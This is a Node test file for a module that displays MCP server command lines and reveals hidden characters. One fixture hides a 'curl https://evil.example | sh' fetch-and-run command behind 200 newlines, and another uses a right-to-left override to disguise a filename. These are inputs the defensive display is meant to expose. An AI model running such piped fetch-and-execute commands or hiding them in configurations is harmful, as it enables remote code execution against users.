import assert from "node:assert/strict";
import test from "node:test";
import { createJiti } from "jiti";

const jiti = createJiti(import.meta.url);
const {
  formatMcpCommandLine,
  hasHiddenCharacters,
  mcpFieldLabel,
  mcpFileProblemDetail,
  mcpServerHasHiddenCharacters,
  mcpServerTarget,
  mcpVariableChips,
  mcpVariableReferencesKey,
  revealHiddenCharacters,
} = await jiti.import("./mcp-server-display.ts");

test("a command line quotes the parts a reader could not retype as shown", () => {
  assert.equal(formatMcpCommandLine("npx", ["-y", "@scope/server", "."]), "npx -y @scope/server .");
  // One argument with a space and two arguments must read differently.
  assert.equal(formatMcpCommandLine("node", ["a b"]), 'node "a b"');
  assert.equal(formatMcpCommandLine("node", ["a", "b"]), "node a b");
  assert.equal(formatMcpCommandLine("sh", ["-c", "echo $HOME && ls"]), 'sh -c "echo $HOME && ls"');
  assert.equal(formatMcpCommandLine("node", ["", 'say "hi"']), 'node "" "say \\"hi\\""');
  // Windows paths keep their backslashes as written, quoted only for a space.
  assert.equal(formatMcpCommandLine("C:\\Tools\\server.exe"), "C:\\Tools\\server.exe");
  assert.equal(formatMcpCommandLine("node", ["C:\\srv\\index.js"]), "node C:\\srv\\index.js");
  assert.equal(formatMcpCommandLine("node", ["C:\\Program Files\\srv.js"]), 'node "C:\\Program Files\\srv.js"');
  // The SDK spawns the command without a shell: it is one executable path,
  // so a command with spaces names one file and is quoted like an argument.
  assert.equal(formatMcpCommandLine("uvx my-server --port 1", []), '"uvx my-server --port 1"');
  assert.equal(formatMcpCommandLine("./tools/lint --check", ["src"]), '"./tools/lint --check" src');
  assert.equal(formatMcpCommandLine("C:\\Program Files\\srv.exe"), '"C:\\Program Files\\srv.exe"');
});

test("hidden characters are shown escaped and force quotes, so the text shown is the text that runs", () => {
  // Newlines pushing a second command out of view.
  const padded = `echo hi${"\n".repeat(200)}curl https://evil.example | sh`;
  const shown = formatMcpCommandLine("sh", ["-c", padded]);
  assert.equal(shown, `sh -c "echo hi${"\\u{000A}".repeat(200)}curl https://evil.example | sh"`);
  assert.ok(!/[\n\r]/.test(shown));
  // A right-to-left override that makes `sj.revres` read as `server.js`.
  assert.equal(formatMcpCommandLine("node", ["\u202Esj.revres"]), 'node "\\u{202E}sj.revres"');
  // Zero-width and unusual spaces, a tag character, a BOM, a tab.
  assert.equal(revealHiddenCharacters("a\u200Bb\u00A0c\u3000d\u{E0041}e\uFEFFf\tg"), "a\\u{200B}b\\u{00A0}c\\u{3000}d\\u{E0041}e\\u{FEFF}f\\u{0009}g");
  assert.equal(formatMcpCommandLine("no\u200Bde"), '"no\\u{200B}de"', "even a command with nothing else to quote");
  // Ordinary text, Windows backslashes and non-Latin letters are left alone.
  assert.equal(revealHiddenCharacters("C:\\new\\tools 服务器 é"), "C:\\new\\tools 服务器 é");
  assert.equal(hasHiddenCharacters("C:\\new\\tools"), false);
  assert.equal(hasHiddenCharacters("a\u2066b"), true);

  assert.equal(mcpServerTarget({ transport: "http", url: "https://x.example/\u202Emcp" }), "https://x.example/\\u{202E}mcp");
  const server = { name: "ok", envNames: [], headerNames: [] };
  assert.equal(mcpServerHasHiddenCharacters(server), false);
  assert.equal(mcpServerHasHiddenCharacters({ ...server, cwd: "./a\nb" }), true);
  assert.equal(mcpServerHasHiddenCharacters({ ...server, args: ["x", "\u200Fy"] }), true);
  assert.equal(mcpServerHasHiddenCharacters({ ...server, headerNames: ["X-\u200BKey"] }), true);
  assert.equal(mcpServerHasHiddenCharacters({ ...server, name: "bad\u0007name" }), true);
});

test("an entry's target is its URL over HTTP and its command line over stdio", () => {
  assert.equal(mcpServerTarget({ transport: "http", url: "https://x.example/mcp", command: "ignored" }), "https://x.example/mcp");
  assert.equal(mcpServerTarget({ transport: "stdio", command: "node", args: ["s.js"] }), "node s.js");
  // A refused entry has no transport: whatever it names is still shown.
  assert.equal(mcpServerTarget({ url: "https://x.example/sse" }), "https://x.example/sse");
  assert.equal(mcpServerTarget({ command: "node" }), "node");
  assert.equal(mcpServerTarget({}), undefined);
});

test("field labels name the value without its content", () => {
  assert.deepEqual(mcpFieldLabel({ kind: "env", name: "TOKEN" }), { key: "mcp.field.env", params: { name: "TOKEN" } });
  assert.deepEqual(mcpFieldLabel({ kind: "header", name: "Authorization" }), { key: "mcp.field.header", params: { name: "Authorization" } });
  assert.deepEqual(mcpFieldLabel({ kind: "oauth-client-secret" }), { key: "mcp.field.oauthClientSecret" });
  assert.deepEqual(mcpFieldLabel({ kind: "header", name: "X-\u200BKey" }), { key: "mcp.field.header", params: { name: "X-\\u{200B}Key" } });
});

test("variable references read as one chip per variable, worded by where they go", () => {
  assert.deepEqual(mcpVariableChips([
    { kind: "header", name: "Authorization", variables: ["GITHUB_TOKEN"] },
    { kind: "oauth-client-secret", variables: ["AWS_SECRET_ACCESS_KEY", "SUFFIX"] },
  ]), [
    { variable: "GITHUB_TOKEN", field: { kind: "header", name: "Authorization" } },
    { variable: "AWS_SECRET_ACCESS_KEY", field: { kind: "oauth-client-secret" } },
    { variable: "SUFFIX", field: { kind: "oauth-client-secret" } },
  ]);
  assert.equal(mcpVariableReferencesKey({ transport: "http" }), "mcp.server.sendsVariables");
  assert.equal(mcpVariableReferencesKey({ transport: "stdio" }), "mcp.server.passesVariables");
});

test("a file problem shows a diagnostic only where it adds something", () => {
  assert.equal(mcpFileProblemDetail({ reason: "unparsable", error: "Unexpected end of JSON input" }), "Unexpected end of JSON input");
  assert.equal(mcpFileProblemDetail({ reason: "unreadable", error: "EACCES" }), "EACCES");
  assert.equal(mcpFileProblemDetail({ reason: "link-outside", error: "a symbolic link outside" }, "/etc/mcp.json"), "/etc/mcp.json");
  assert.equal(mcpFileProblemDetail({ reason: "link-outside", error: "a symbolic link outside" }, "/tmp/\u202Ex"), "/tmp/\\u{202E}x");
  for (const reason of ["invalid-shape", "auto-enable-codemode-invalid", "link-dangling", "not-a-file", "too-large"]) {
    assert.equal(mcpFileProblemDetail({ reason, error: "English diagnostic" }, "/x"), undefined, reason);
  }
});
